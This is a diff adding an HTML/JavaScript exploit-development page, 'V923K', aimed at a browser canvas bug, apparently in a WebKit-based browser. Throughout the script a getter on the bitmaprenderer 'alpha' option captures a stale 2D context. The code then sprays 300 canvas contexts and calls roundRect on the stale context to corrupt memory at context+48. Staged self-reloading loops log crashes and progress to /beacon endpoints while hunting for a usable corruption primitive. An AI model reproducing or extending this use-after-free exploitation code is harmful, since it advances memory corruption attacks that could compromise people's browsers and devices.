@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V923K - deep exercise of roundRect m_path overwrite on 2D-reclaimed slot</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V923K - deep corruption exercise (roundRect writes cairo_t* @ +48 on valid 2D reclaim)</h1>
+
+<p class="key">
+<b>V923I scan stopped</b> (memory dialog every LWCRASH; crash-scan impractical on 14.20). V923G/J proved
+<code>roundRect</code> executes on valid 2D reclaim and overwrites <code>m_path</code> at <code>context+48</code> with a
+heap <code>cairo_t*</code>, but V923J saw no immediate corruption. V923K stress-tests <b>every</b> reclaiming context
+(path ops, fill/stroke/clip/save/restore/transform, repeated roundRect+reset cycles) and stale CTX, looking for any
+crash/exception/anomaly primitive. Reading the pointer remains blocked without an address-known forge (AB reclaim needs
+valid vptrs/forged state; address scan causes memory dialogs).
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v923k_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v923k_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v923k_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V923K-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || e).slice(0, 90) : 'none'; }
+function reloadSoon(ms) { setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, ms); }
+
+var CTX = null, HASRR = false, KEEP = null;
+
+function trigger(canvas) {
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch (e0) {}
+      try { ctx.lineWidth = 2; ctx.fillStyle = '#123456'; ctx.strokeStyle = '#654321'; } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+function spray2d(count) {
+  var keep = [];
+  for (var i = 0; i < count; i++) {
+    var c = document.createElement('canvas'); c.width = 16; c.height = 16;
+    var cx = null; try { cx = c.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.beginPath(); cx.moveTo(1,1); cx.lineTo(10,1); cx.lineTo(10,10); cx.closePath(); cx.lineWidth = 10 + (i % 7); } catch (e2) {}
+      keep.push({ c: c, cx: cx, i: i });
+    }
+  }
+  KEEP = keep; return keep;
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+var STAGES = ['corrupt', 'all-path', 'all-draw', 'all-state', 'cycles', 'stale-heavy'];
+function stageIdx(s) { for (var i = 0; i < STAGES.length; i++) if (STAGES[i] === s) return i; return 0; }
+function curStage() { return lsGet('stage') || STAGES[0]; }
+function advance(msg) {
+  var i = stageIdx(curStage());
+  if (i + 1 < STAGES.length) { lsSet('stage', STAGES[i + 1]); lsDel('tries'); bks('ADV', STAGES[i] + '->' + STAGES[i + 1] + (msg ? ',' + msg : '')); }
+  else { lsSet('phase', 'done'); bks('DONE', 'all stages done'); }
+}
+
+function step(tag, label, fn) {
+  var st = curStage(), t = bumpTry();
+  bks(tag + '-PRE', 'stage=' + st + ',try=' + t + ',' + label);
+  say(tag + ' ' + label);
+  lsSet('pending', st + ':' + tag);
+  var res, err = null; try { res = fn(); } catch (e) { err = e; }
+  lsDel('pending');
+  if (err) { bks(tag + '-ERR', 'stage=' + st + ',' + errOf(err)); say(tag + ' ERR ' + errOf(err)); return { ok: false, err: err }; }
+  bks(tag + '-OK', 'stage=' + st + (res !== undefined ? ',' + String(res).slice(0, 140) : ''));
+  return { ok: true, res: res };
+}
+
+function exerciseAll(keep, mode) {
+  var ok = 0, err = 0, anom = [];
+  for (var i = 0; i < keep.length; i++) {
+    var cx = keep[i].cx;
+    try {
+      if (mode === 'path') {
+        cx.beginPath(); cx.rect(0,0,5,5); cx.moveTo(1,1); cx.lineTo(8,8); cx.quadraticCurveTo(4,4,8,1);
+        cx.closePath(); cx.isPointInPath(2,2); cx.isPointInStroke(1,1);
+      } else if (mode === 'draw') {
+        cx.save(); cx.beginPath(); cx.rect(0,0,6,6); cx.fillStyle = '#00aa00'; cx.fill();
+        cx.strokeStyle = '#0000aa'; cx.stroke(); cx.restore();
+      } else if (mode === 'state') {
+        cx.save(); cx.translate(1,1); cx.rotate(0.1); cx.scale(1,1);
+        cx.beginPath(); cx.rect(0,0,4,4); cx.clip();
+        cx.restore(); cx.setTransform(1,0,0,1,0,0);
+      }
+      ok++;
+    } catch (e) { err++; if (anom.length < 8) anom.push('i' + i + ':' + errOf(e)); }
+  }
+  return { ok: ok, err: err, anom: anom };
+}
+
+function main() {
+  var q = location.search;
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('stage'); lsDel('tries');
+    bks('RESET', 'cleared'); say('cleared. reopen ?op=auto'); return;
+  }
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > 200) { bks('GIVEUP', 'loads=' + loads); return; }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending'); var t = triesOf();
+    bks('CRASH', 'pending=' + pend + ',try=' + t + ',load=' + loads);
+    say('CRASH ' + pend);
+    if (t >= 2) { bks('BLACKLIST', pend); advance('crashx2'); }
+    reloadSoon(3500); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var st = curStage();
+  bks('BOOT', 'load=' + loads + ',stage=' + st + ',ua=' + navigator.userAgent.slice(0, 44));
+
+  var canvas = document.createElement('canvas'); canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas); window._v923kcanvas = canvas;
+  var tr = trigger(canvas);
+  if (!tr.saved) { bks('ERR', 'trigger-failed'); reloadSoon(3000); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  bks('PREFLIGHT', 'rr=' + HASRR);
+  var keep = spray2d(300);
+  bks('ARM', '2dctx=' + keep.length + ',stage=' + st);
+
+  if (st === 'corrupt') {
+    if (!HASRR) { bks('NORR', 'x'); advance('norr'); reloadSoon(3000); return; }
+    if (step('RR', 'stale.roundRect', function () { CTX.roundRect(10,10,100,100,5); }).ok) advance('rr-ok'); else advance('rr-err');
+    reloadSoon(3000); return;
+  }
+  if (st === 'all-path') {
+    if (HASRR) step('RR2', 'stale.roundRect', function () { CTX.roundRect(10,10,100,100,5); });
+    var r = exerciseAll(keep, 'path');
+    bks('ALLPATH', 'ok=' + r.ok + ',err=' + r.err + ',anom=' + r.anom.join('|').slice(0,300));
+    say('all-path ok=' + r.ok + ' err=' + r.err);
+    advance('path-done'); reloadSoon(3000); return;
+  }
+  if (st === 'all-draw') {
+    if (HASRR) step('RR3', 'stale.roundRect', function () { CTX.roundRect(10,10,100,100,5); });
+    var r = exerciseAll(keep, 'draw');
+    bks('ALLDRAW', 'ok=' + r.ok + ',err=' + r.err + ',anom=' + r.anom.join('|').slice(0,300));
+    say('all-draw ok=' + r.ok + ' err=' + r.err);
+    advance('draw-done'); reloadSoon(3000); return;
+  }
+  if (st === 'all-state') {
+    if (HASRR) step('RR4', 'stale.roundRect', function () { CTX.roundRect(10,10,100,100,5); });
+    var r = exerciseAll(keep, 'state');
+    bks('ALLSTATE', 'ok=' + r.ok + ',err=' + r.err + ',anom=' + r.anom.join('|').slice(0,300));
+    say('all-state ok=' + r.ok + ' err=' + r.err);
+    advance('state-done'); reloadSoon(3000); return;
+  }
+  if (st === 'cycles') {
+    var r = step('CYCLES', '20x roundRect/beginPath on stale + all draw', function () {
+      var ok = 0, err = 0;
+      for (var c = 0; c < 20; c++) {
+        try { if (HASRR) CTX.roundRect(10,10,100,100,5); CTX.beginPath(); if (HASRR) CTX.roundRect(5,5,50,50,2); } catch (e) { err++; }
+      }
+      for (var i = 0; i < keep.length; i++) { try { keep[i].cx.beginPath(); keep[i].cx.rect(0,0,3,3); keep[i].cx.fill(); ok++; } catch (e) { err++; } }
+      return 'ok=' + ok + ',err=' + err;
+    });
+    bks('CYCRES', r.ok ? r.res : 'ERR');
+    advance('cycles-done'); reloadSoon(3000); return;
+  }
+  if (st === 'stale-heavy') {
+    var r = step('HEAVY', 'stale path/fill/stroke/isPoint/clip x30', function () {
+      var ok = 0, err = 0;
+      for (var i = 0; i < 30; i++) {
+        try {
+          CTX.beginPath(); if (HASRR) CTX.roundRect(1+i,1,40,40,4); CTX.closePath();
+          CTX.isPointInPath(5,5); CTX.isPointInStroke(2,2);
+          CTX.save(); CTX.clip(); CTX.fillStyle='#111'; try { CTX.fill(); } catch (e2) {} CTX.restore();
+          ok++;
+        } catch (e) { err++; }
+      }
+      return 'ok=' + ok + ',err=' + err;
+    });
+    bks('HEAVYRES', r.ok ? r.res : 'ERR');
+    advance('heavy-done'); reloadSoon(3000); return;
+  }
+  advance('unknown'); reloadSoon(3000);
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
